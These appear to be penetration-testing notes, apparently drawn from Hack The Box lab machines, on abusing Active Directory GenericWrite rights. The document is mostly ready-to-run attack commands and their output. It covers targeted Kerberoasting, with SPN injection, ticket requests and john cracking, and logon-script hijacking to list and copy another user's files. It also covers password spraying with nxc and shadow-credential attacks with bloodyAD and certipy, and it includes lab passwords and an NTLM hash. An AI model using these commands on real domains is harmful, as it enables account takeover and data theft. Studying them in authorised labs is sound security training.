
- This permission allows you to perform a targeted Kerberoasting attack.
- By leveraging the write access, you can add a temporary SPN (Service Principal Name) to the jerri_lancaster account.
- Once the SPN is added, you can request a service ticket for that account and then carry out the usual Kerberoasting process (offline password cracking)

---
## Targeted Kerberoasting

#### Remotely

Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'riley' -p 'P@ssw0rd' --dc-host dc.painters-htb --request-user web_svc
```

Bruteforced an password out of the TGT

```
john jerri_lancaster --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovinlife!       (?)     
1g 0:00:00:00 DONE (2026-05-14 14:18) 3.333g/s 2085Kp/s 2085Kc/s 2085KC/s lrcjks..love2cook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
#### Internally Windows Abuse

#### 1. Requesting TGT Method

A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

1. Add SPN to user "maria".

```
Set-DomainObject -Identity maria -SET @{serviceprincipalname='somerandomdomain/hacked'}
```

2. Verified that we added the SPN successfully.

```
Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
somerandomdomain/hacked
```

3. To actually Kerberoast, I’ll need to use an SPN with a valid format unlike our current, so I’ll use that one going forward.

```
setspn -a MSSQLSvc/object.local:1433 object.local\maria
```

4. Verified the change.

```
*Evil-WinRM* PS C:\Users\smith\Documents> Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
{MSSQLSvc/object.local:1433, somerandomdomain/hacked}
```

5. Requested TGT, but got an error:

```
*Evil-WinRM* PS C:\Users\smith\Documents> Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433"
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
```

The error is because the service doesn't know who we are. To solve this we can create an credential object.

```
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
```

```
$cred = New-Object System.Management.Automation.PSCredential('object.local/smith', $pass)
```

Requesting the TGT gave us an error.

```
Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $Cred

Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: \object.local/smith
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."
Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
```
#### 2. Modifying Login Script of user

We can use GenericWrite also to update their logon scripts. This script would run the next time the user logs in. Since Firewall blocks everything and I can't connect back to my local machine I have no other choice then to enumerate the user's directory.
##### Command Execution

```
echo "ls \users\maria\documents > \temp\documents" > cmd.ps1
```

```
Set-DomainObject -Identity maria -SET @{scriptpath="C:\Temp\cmd.ps1"}
```

This worked after a couple of seconds I gained the documents file which represents the documents directory of user "maria". Let's do the same thing for her Desktop!

```
echo "ls \users\maria\desktop > \temp\desktop" > cmd.ps1
```

There seems to be an interesting Engines.xls file.

```
type desktop


    Directory: C:\users\maria\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
```

Let's do the same trick we did with viewing the directory, for moving the .xls file into an directory we have access to.

```
echo "copy \users\maria\desktop\Engines.xls \temp\" > cmd.ps1
```

Downloaded the Engines.xls file onto my local machine.

```
download Engines.xls
```

Opened up the file using libreoffice.

```
libreoffice --calc Engines.xls
```

Retrieved 3 potential passwords for user "maria". Stored them inside an passwords.txt file on my local machine.

```
d34gb8@
0de_434_d545
W3llcr4ft3d_4cls
```

Sprayed credentials.

```
nxc winrm 10.129.63.128 -u maria -p passwords.txt
```

---
## 2. Method: Shadow Credentials

It is often more saver to utilize shadow creds instead of changing the password to avoid lockout or being to loud. 

Adding current user to the group using "BloodyAD".

```
bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H 10.129.19.236 add groupmember 'service accounts' p.agila
```

Abusing GenericWrite to an service account and requesting NTLM Hash.

```
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236
```

or with bloodyad

```
bloodyad --host 10.129.232.75 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add shadowCredentials adam.silver
```

Shadow Credential Attack NTLM Auth

```
certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
```

Shadow Credential Attack Kerberos

```
bloodyad --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials msa_health$
```